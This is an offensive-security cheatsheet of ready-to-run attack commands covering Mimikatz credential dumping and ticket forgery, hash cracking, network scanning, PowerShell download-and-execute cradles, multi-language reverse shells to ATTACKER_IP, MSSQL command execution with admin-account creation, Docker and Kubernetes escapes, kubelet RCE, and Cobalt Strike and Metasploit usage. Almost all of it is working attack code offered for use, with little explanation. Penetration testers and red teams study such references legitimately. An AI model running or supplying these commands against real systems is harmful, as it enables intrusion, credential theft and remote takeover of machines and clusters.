# Cheatsheets — Mimikatz, Hash Cracking, Network, Shells, MSSQL, Containers, C2

## Mimikatz

```powershell
# One-liner
.\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit

# Interactive
privilege::debug
token::elevate
sekurlsa::logonpasswords     # dump all plaintext/NTLM
sekurlsa::wdigest            # wdigest (disabled Win8.1+)
sekurlsa::ekeys              # Kerberos enc keys (AES128/256)
sekurlsa::kerberos           # Kerberos tickets
sekurlsa::tickets /export    # dump tickets to .kirbi
sekurlsa::dpapi              # masterkeys

# Re-enable WDigest (plaintext) on Win2012+
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /f /d 1

# LSASS dump (offline)
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\temp\lsass.dmp full
sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords
pypykatz lsa minidump lsass.dmp   # Linux offline

# LSA Protected Process (RunAsPPL) bypass
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
!+                                # load mimidriver.sys
!processprotect /process:lsass.exe /remove
sekurlsa::logonpasswords
!processprotect /process:lsass.exe
!-
PPLdump.exe lsass.exe lsass.dmp   # alternative

# Credential Guard (LSAISO) bypass
tasklist | findstr lsaiso
misc::memssp                      # inject SSP → logs to c:\windows\system32\mimilsa.log

# Pass-The-Hash
sekurlsa::pth /user:Administrator /domain:contoso.local /ntlm:HASH /run:cmd.exe
sekurlsa::pth /user:Administrator /domain:contoso.local /ntlm:HASH /run:"mstsc.exe /restrictedadmin"

# Golden / Silver Tickets
kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:S-1-5-21-... /krbtgt:HASH /ptt
kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:S-1-5-21-... /target:SERVER /service:cifs /rc4:HASH /ptt
kerberos::ptt ticket.kirbi
kerberos::list

# Skeleton Key (DC only, in-memory patch)
privilege::debug
misc::skeleton
# All accounts can then auth with password "mimikatz"

# DCSync
lsadump::dcsync /domain:domain.local /user:krbtgt
lsadump::dcsync /domain:domain.local /all /csv

# SAM / NTDS
lsadump::sam
lsadump::lsa /patch
lsadump::trust /patch        # trust keys

# DPAPI
dpapi::cred /in:C:\Users\<user>\AppData\Local\Microsoft\Credentials\<file>
!sekurlsa::dpapi              # masterkeys from memory
dpapi::cred /in:<file> /masterkey:<key>
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
vault::cred /patch            # scheduled task credentials

# RDP Session Takeover
privilege::debug
token::elevate
ts::sessions
ts::remote /id:<session_id>
# Or: create service with tscon
query user
sc create sesshijack binpath= "cmd.exe /k tscon <id> /dest:rdp-tcp#<num>"
net start sesshijack

# RDP Passwords (from svchost dump)
ts::logonpasswords

# SID History abuse
misc::addsid victim admin
```

### Mimikatz Command Reference

| Module | Command | Purpose |
|--------|---------|---------|
| privilege | `privilege::debug` | Get debug rights |
| token | `token::elevate` | Elevate to SYSTEM |
| token | `token::list` | List all tokens |
| sekurlsa | `sekurlsa::logonpasswords` | Dump all creds |
| sekurlsa | `sekurlsa::pth` | Pass-the-Hash |
| sekurlsa | `sekurlsa::tickets /export` | Export Kerberos tickets |
| kerberos | `kerberos::golden` | Create Golden/Silver ticket |
| kerberos | `kerberos::ptt` | Pass-the-Ticket |
| lsadump | `lsadump::dcsync` | DCSync (no code on DC) |
| lsadump | `lsadump::sam` | Dump local SAM |
| lsadump | `lsadump::trust` | Dump trust keys |
| crypto | `crypto::certificates` | List/export certs |
| misc | `misc::skeleton` | Skeleton Key |
| misc | `misc::memssp` | Inject SSP logger |
| dpapi | `dpapi::cred` | Decrypt credential blob |
| vault | `vault::cred /patch` | Windows Vault creds |

### PowerShell / In-Memory

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://IP/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
Invoke-Mimikatz -DumpCreds
Invoke-Mimikatz -DumpCerts
```

---

## Hash Cracking

### Hashcat Modes (Common)

| Mode | Hash Type |
|------|-----------|
| 1000 | NTLM |
| 3000 | LM |
| 5500 | NTLMv1 / Net-NTLMv1 |
| 5600 | NTLMv2 / Net-NTLMv2 |
| 13100 | Kerberoast (TGS-REP) |
| 18200 | ASREPRoast (AS-REP) |
| 19700 | Timeroast |
| 131 | MSSQL 2000 |
| 132 | MSSQL 2005 |
| 1731 | MSSQL 2012/2014 |
| 1800 | sha512crypt (Linux shadow) |
| 500 | md5crypt (Linux shadow) |

### Dictionary Attack

```bash
hashcat -m 1000 -a 0 hashes.txt rockyou.txt
hashcat -m 5600 -a 0 ntlmv2.txt rockyou.txt -r rules/best64.rule
hashcat -m 13100 -a 0 kerberoast.txt wordlist.txt -r rules/OneRuleToRuleThemAll.rule
hashcat --loopback -a 0 -r rules.rule -m 1000 hashes.txt wordlist.txt
```

### Mask Attack (brute-force patterns)

```bash
# Masks: ?l=lower ?u=upper ?d=digit ?s=special ?a=all ?b=0x00-0xff
hashcat -m 1000 -a 3 hashes.ntds ?u?l?l?l?l?l?d?d          # Word123
hashcat -m 1000 -a 3 hashes.ntds ?u?l?l?l?l?l?l?d?d         # Longer
hashcat -m 1000 -a 3 hashes.ntds -1 "*+!??" ?u?l?l?l?l?l?d?d?1   # +special
hashcat -m 1000 -a 3 hashes.ntds ?u?l?l?l?d?d?d?d           # Pass1234 pattern
hashcat -m 1000 -a 3 --increment --increment-min 6 --increment-max 10 hashes.ntds "?a?a?a?a?a?a?a?a?a?a"
```

### NTLMv1 Special (shuck)

```bash
# Set Responder challenge: 1122334455667788
# /etc/responder/Responder.conf → Challenge = 1122334455667788
# Send to crack.sh (free if in HIBP database) or:
hashcat -m 5500 -a 3 ntlmv1.txt                    # plain crack
hashcat -m 27000 -a 0 ntlmv1.txt nthashes.txt       # NTLMv1→NT hash
php shucknt.php -f tokens.txt -w pwned-passwords-ntlm-reversed-v8.bin
```

### John

```bash
john --wordlist=rockyou.txt --rules=Jumbo hashes.txt
john --format=netntlmv2 ntlmv2.txt
john --show hashes.txt
```

### Wordlists & Rules

- **Wordlists**: rockyou.txt, weakpass_3a, Hashes.org, clem9669/wordlists, kerberoast_pws
- **Rules**: OneRuleToRuleThemAll, nsa-rules, hob064, d3adhob0, clem9669/hashcat-rule
- **Online**: hashes.com, crackstation.net, hashmob.net
- **Cloud GPU**: penglab (Google Colab), Cloudtopolis

---

## Network Discovery

### Nmap

```bash
# Ping sweep - no port scan
nmap -sn -n --disable-arp-ping 192.168.1.0/24

# Quick service scan
nmap -sV -sC -oA scan 192.168.1.1

# Full port + version
sudo nmap -sSV -p- 192.168.1.1 -oA full -T4

# Aggressive
nmap -A -T4 192.168.1.0/24

# Searchsploit integration
nmap -p- -sV -oX scan.xml TARGET && searchsploit --nmap scan.xml

# SMB users
nmap --script smb-enum-users.nse -p 445 TARGET

# DHCP discover
nmap --script broadcast-dhcp-discover
```

### Masscan + Nmap Pipeline

```bash
# Discover live hosts
masscan --rate 500 -p80,443,445,3389,22 192.168.1.0/24 -oL masscan.out
cat masscan.out | grep open | cut -d " " -f4 | sort -u > live_hosts.txt

# Deep scan on open ports
TCP_PORTS=$(cat masscan.out | grep open | grep tcp | cut -d " " -f3 | tr '\n' ',' | head -c -1)
sudo nmap -sT -sC -sV -Pn -n -T4 -p$TCP_PORTS --reason -oA nmap_tcp TARGET
```

### ARP / Other

```bash
arp-scan -l                          # ARP sweep
netdiscover -i eth0 -r 192.168.1.0/24
nbtscan -r 192.168.1.0/24           # NetBIOS scan
nmap -sn -n 192.168.1.0/24          # ICMP sweep

# No-tool fallback
for i in $(seq 1 254); do ping -c 1 -w 1 192.168.1.$i > /dev/null 2>&1 && echo "UP: 192.168.1.$i"; done
for p in 22 80 445 3389 8080; do nc -z -w 1 192.168.1.10 $p 2>/dev/null && echo "Port $p open"; done

# DNS SRV records (AD discovery)
nslookup -type=srv _ldap._tcp.dc._msdcs.DOMAIN.LOCAL
nslookup -type=srv _kerberos._tcp.DOMAIN.LOCAL
```

### MITM / Passive

```bash
responder -I eth0 -A          # passive mode (observe only)
responder -I eth0 -wfrd -P -v # active capture

# Bettercap
sudo bettercap -iface eth0
# net.probe on; set arp.spoof.targets 192.168.1.0/24; arp.spoof on; net.sniff on

# LDAP null bind
ldapsearch -x -h DC_IP -s base
```

---

## PowerShell Cheatsheet

### Execution Policy Bypass

```powershell
powershell -ep bypass .\script.ps1
powershell -ExecutionPolicy Bypass -File script.ps1
Set-ExecutionPolicy Bypass -Scope Process
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy UnRestricted

# Check constrained language mode
$ExecutionContext.SessionState.LanguageMode   # FullLanguage or ConstrainedLanguage
powershell -version 2                          # bypass CLM (if .NET 2 installed)
```

### Encoded Commands

```powershell
# Windows
$cmd = 'IEX (New-Object Net.WebClient).DownloadString("http://IP/script.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$enc = [Convert]::ToBase64String($bytes)
powershell -EncodedCommand $enc

# Linux (UTF-16LE required)
echo 'IEX (New-Object Net.WebClient).DownloadString("http://IP/script.ps1")' | iconv -t utf-16le | base64 -w0
```

### Download & Execute

```powershell
# Download file
(New-Object System.Net.WebClient).DownloadFile("http://IP/file.exe", "C:\temp\file.exe")
IWR "http://IP/file.exe" -OutFile "C:\temp\file.exe"
wget "http://IP/file.exe" -OutFile "C:\temp\file.exe"
Import-Module BitsTransfer; Start-BitsTransfer -Source $url -Destination $out

# In-memory execution
IEX (New-Object Net.WebClient).DownloadString('http://IP/script.ps1')
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://IP/script.ps1')|iex"

# Non-proxy aware
$h = new-object -com WinHttp.WinHttpRequest.5.1
$h.open('GET','http://IP/script.ps1',$false); $h.send(); iex $h.responseText
```

### Reflective .NET Assembly

```powershell
# Load and run exe in memory
$data = (New-Object System.Net.WebClient).DownloadData('http://IP/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("kerberoast /outfile:hashes.txt".Split())

# Load DLL and call method
$data = (New-Object System.Net.WebClient).DownloadData('http://IP/lib.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("Namespace.ClassName")
$class.GetMethod("MethodName").Invoke(0, $null)
```

### Misc

```powershell
# Decode SecureString
$ss = "01000000d08..." | ConvertTo-SecureString
(New-Object System.Management.Automation.PSCredential('x', $ss)).GetNetworkCredential().Password

# Port scan (PowerShell native)
tnc 192.168.1.1 -Port 445
1..1024 | % { if (tnc 192.168.1.1 -Port $_ -InformationLevel Quiet) { "Port $_ open" } }
```

---

## Reverse Shells

```bash
# Bash TCP
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/4444; sh <&196 >&196 2>&196

# Bash UDP
sh -i >& /dev/udp/ATTACKER_IP/4444 0>&1

# Netcat traditional
nc -e /bin/sh ATTACKER_IP 4444
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f

# Netcat OpenBSD (no -e)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc -l 4444 > /tmp/f   # bind

# Socat (interactive TTY)
# Attacker: socat file:`tty`,raw,echo=0 TCP-L:4444
# Victim:   /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python (PTY)
python3 -c 'import pty,socket,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'

# PHP
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# PowerShell
powershell -nop -w hidden -e <BASE64>
$client=New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+"PS "+(pwd).Path+"> ";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# Ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("ATTACKER_IP","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

# Golang
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","ATTACKER_IP:4444");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go

# OpenSSL encrypted
# Attacker: openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
# Attacker: openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
# Victim:   openssl s_client -quiet -connect ATTACKER_IP:4444|/bin/bash|openssl s_client -quiet -connect ATTACKER_IP:4445
```

### Spawn TTY Shell

```bash
# Python
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'

# After python pty: Ctrl+Z → stty raw -echo; fg → reset → export TERM=xterm

# Script
script /dev/null -c bash

# Socat
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444

# Other
echo os.system('/bin/bash')
/bin/sh -i
```

### Meterpreter Stagers

```bash
# Windows staged
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe
# Linux staged
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf > shell.elf
# Stageless
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe
```

---

## MSSQL Attacks

### Enumeration

```powershell
# PowerUpSQL
Get-SQLInstanceLocal
Get-SQLInstanceDomain -Verbose | Get-SQLServerInfo -Verbose
Get-SQLInstanceDomain | Get-SQLDatabase -NoDefaults
Get-SQLInstanceDomain | Get-SQLColumnSampleData -Keywords "password,secret,key" -SampleSize 5
Invoke-SQLDumpInfo -Verbose -Instance SQLSERVER1\Instance1 -csv

# SQLRecon
SQLRecon.exe /auth:wintoken /host:SQLSERVER /module:whoami
SQLRecon.exe /auth:wintoken /host:SQLSERVER /module:users

# Impacket
mssqlclient.py DOMAIN/user:pass@10.10.10.10 -windows-auth
mssqlclient.py 'sa:Password1234@10.10.10.10'
```

```sql
-- Identity
select suser_sname(); select system_user; select @@version;
select is_srvrolemember('sysadmin')
SELECT name FROM master..sysdatabases
select * from sys.server_principals where type_desc != 'SERVER_ROLE'
SELECT name FROM sys.server_principals WHERE IS_SRVROLEMEMBER('sysadmin',name)=1

-- Credentials
SELECT name, password_hash FROM master.sys.sql_logins  -- MSSQL 2005+ (hashcat -m 1731)
SELECT * FROM sys.credentials
```

### Command Execution

```sql
-- xp_cmdshell (disabled by default since 2005)
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
EXEC master..xp_cmdshell 'net user hacker P@ss123 /add && net localgroup administrators hacker /add';
```

```powershell
# PowerUpSQL
Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "SERVER\INST" -Command "whoami"

# OLE Automation (disabled by default)
# Enable: EXEC sp_configure 'OLE Automation Procedures', 1; RECONFIGURE;
DECLARE @execmd INT
EXEC SP_OACREATE 'wscript.shell', @execmd OUTPUT
EXEC SP_OAMETHOD @execmd, 'run', null, 'cmd.exe /c whoami > C:\temp\out.txt'
```

```sql
-- Agent Job execution (requires SQLAgentUserRole or sysadmin)
USE msdb;
EXEC dbo.sp_add_job @job_name = N'pwn';
EXEC sp_add_jobstep @job_name = N'pwn', @step_name = N's1', @subsystem = N'CmdExec',
  @command = N'cmd.exe /c whoami > C:\temp\out.txt';
EXEC dbo.sp_add_jobserver @job_name = N'pwn';
EXEC dbo.sp_start_job N'pwn';
-- Cleanup: EXEC dbo.sp_delete_job @job_name = N'pwn';
```

### Linked Databases (lateral movement)

```sql
-- Find links
select * from master..sysservers

-- Execute through link (RPC must be enabled)
select * from openquery("SQL-LINKED", 'select @@version')
EXECUTE('xp_cmdshell ''whoami''') AT "linked.database.local"

-- Enable xp_cmdshell on linked server
EXEC sp_serveroption 'sqllinked-hostname', 'rpc out', 'true';
EXECUTE('sp_configure ''xp_cmdshell'',1; RECONFIGURE') AT "SQL-LINKED";
EXECUTE('xp_cmdshell ''whoami''') AT "SQL-LINKED";

-- Create admin on chained link
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMAIN\SERVER1"') AT "DOMAIN\SERVER2"
```

```powershell
# PowerUpSQL
Get-SQLServerLinkCrawl -Instance "SERVER\Instance1" -Verbose
Get-SQLServerLink -Instance "SERVER\Instance1" -Verbose
```

---

## Docker / Container Attacks

### Enumeration Inside Container

```bash
# Am I in a container?
cat /proc/1/cgroup | grep docker
ls -la /.dockerenv

# Privileged?
ls /dev/kmsg   # exists = likely privileged
capsh --print

# deepce - automated enum
./deepce.sh
```

### Mounted Docker Socket Escape

```bash
# Check if socket is mounted
ls /var/run/docker.sock
curl --unix-socket /var/run/docker.sock http://127.0.0.1/containers/json

# Escape via new container
docker run --rm -it -v /:/mnt ubuntu bash
chroot /mnt

# Or via API
curl -XPOST --unix-socket /var/run/docker.sock \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/mnt"],"Privileged":true}' \
  -H 'Content-Type: application/json' http://localhost/containers/create
```

### Open Docker API (port 2375/2376)

```bash
export DOCKER_HOST=tcp://10.10.10.10:2375
docker ps
docker run --rm -it -v /:/mnt ubuntu bash
# TLS (2376)
curl --insecure https://10.10.10.10:2376/containers/json
docker -H open.docker.socket:2375 exec -it mysql /bin/bash
```

### Privileged Container Escape (cgroup v1)

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent

cat > /cmd << EOF
#!/bin/sh
id > $host_path/output
EOF
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
sleep 1; cat /output
```

### Insecure Registry

```bash
curl -sk https://registry.example.com/v2/_catalog
curl -sk https://registry.example.com/v2/<image>/tags/list
docker pull registry.example.com:443/<image>:<tag>
python docker_image_fetch.py -u http://admin:admin@docker.registry.local
```

---

## Kubernetes Attacks

### Recon from Inside Pod

```bash
# Service account token (auto-mounted)
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
MASTER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
CACERT="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"

# Check permissions
kubectl auth can-i --list
kubectl auth can-i --list --namespace=kube-system

# API calls
curl -sk --cacert $CACERT -H "Authorization: Bearer $TOKEN" $MASTER/api/v1/namespaces/$NAMESPACE/secrets
curl -sk --cacert $CACERT -H "Authorization: Bearer $TOKEN" $MASTER/api/v1/namespaces/kube-system/secrets
```

### RBAC Exploitation

```bash
# Privileged pod to escape to host
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: escape
  namespace: kube-system
spec:
  containers:
  - name: escape
    image: alpine
    command: ["/bin/sh", "-c", "chroot /host bash"]
    volumeMounts:
    - mountPath: /host
      name: host
    securityContext:
      privileged: true
  volumes:
  - name: host
    hostPath:
      path: /
  hostNetwork: true
  hostPID: true
  serviceAccountName: bootstrap-signer
  automountServiceAccountToken: true
EOF
kubectl exec -it escape -n kube-system -- bash

# Patch rolebinding to escalate SA
kubectl create rolebinding priv-rb --clusterrole=admin --serviceaccount=$NAMESPACE:default -n kube-system

# Impersonate privileged account
kubectl --as=system:admin get secrets -n kube-system
```

### Kubelet RCE (port 10250)

```bash
# Anonymous auth (no creds needed)
curl -sk https://NODE_IP:10250/pods | jq '.items[].metadata.name'
curl -sk https://NODE_IP:10250/run/NAMESPACE/POD/CONTAINER \
  -d "cmd=id"

# Tool: serain/kubelet-anon-rce
python3 kubelet-anon-rce.py --node NODE_IP --namespace NAMESPACE --pod POD --container CONTAINER --exec "id"
```

### Obtain SA Token from etcd / secrets

```bash
# List secrets via API
curl -sk --cacert $CACERT -H "Authorization: Bearer $TOKEN" $MASTER/api/v1/secrets

# If etcd accessible (port 2379)
etcdctl --endpoints=https://ETCD_IP:2379 get / --prefix --keys-only | grep secrets
etcdctl --endpoints=https://ETCD_IP:2379 get /registry/secrets/kube-system/clusterrole-aggregation-controller
```

---

## C2 Frameworks Quick Reference

### Cobalt Strike

```bash
# Start teamserver
sudo ./teamserver ATTACKER_IP "password" [/path/to/c2.profile]
```

```powershell
# Beacon listener (SMB / HTTP / HTTPS / DNS)
# Beacon generation: Attacks → Packages → Windows EXE / Stageless

# Powershell stager
powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://C2/PAYLOAD'))"

# Beacon commands
sleep 0               # interactive
shell whoami          # run via cmd.exe
run whoami            # run without cmd.exe
execute-assembly Rubeus.exe kerberoast /outfile:hashes.txt
psinject <pid> x64 PowerView.ps1
jump psexec64 TARGET smb_listener
jump winrm64 TARGET smb_listener
remote-exec wmi TARGET cmd.exe /c <cmd>
spawnas DOMAIN\user password smb_listener
make_token DOMAIN\user password
rev2self
getsystem
hashdump
dcsync domain.local DOMAIN\krbtgt
```

```powershell
# NTLM Relay via CS
rportfwd 8445 127.0.0.1 445  # forward incoming 8445 to local 445
PortBender redirect 445 8445
ntlmrelayx.py -t smb://TARGET -smb2support

# Pivoting via SOCKS
socks 1080           # start SOCKS4a proxy on teamserver:1080
proxychains nmap -sT TARGET
```

### Metasploit

```bash
msfconsole -q

# Common handlers
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST ATTACKER_IP; set LPORT 4444
exploit -j

# Generate payloads
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=443 -f dll -o inject.dll

# Meterpreter post-exploitation
getsystem
hashdump
run post/windows/gather/credentials/credential_collector
run post/multi/recon/local_exploit_suggester
use auxiliary/server/socks_proxy; set VERSION 5; run -j
route add 192.168.1.0/24 SESSION_ID

# SMB
use exploit/windows/smb/psexec
set SMBUser admin; set SMBPass aad3b435b51404eeaad3b435b51404ee:NTLM_HASH

# Kerberoast
use auxiliary/gather/get_user_spns
set RHOSTS DC_IP; set USER user; set PASS pass; set DOMAIN domain.local
```

### Mythic C2

```bash
# Install
git clone https://github.com/its-a-feature/Mythic && cd Mythic
./mythic-cli start
# Access: https://ATTACKER_IP:7443 (admin/mythic_password)

# Agents: Poseidon (Linux/macOS Go), Apollo (Windows .NET), Medusa
# Install agent: ./mythic-cli install github https://github.com/MythicAgents/Apollo
# Install C2 profile: ./mythic-cli install github https://github.com/MythicC2Profiles/http
```
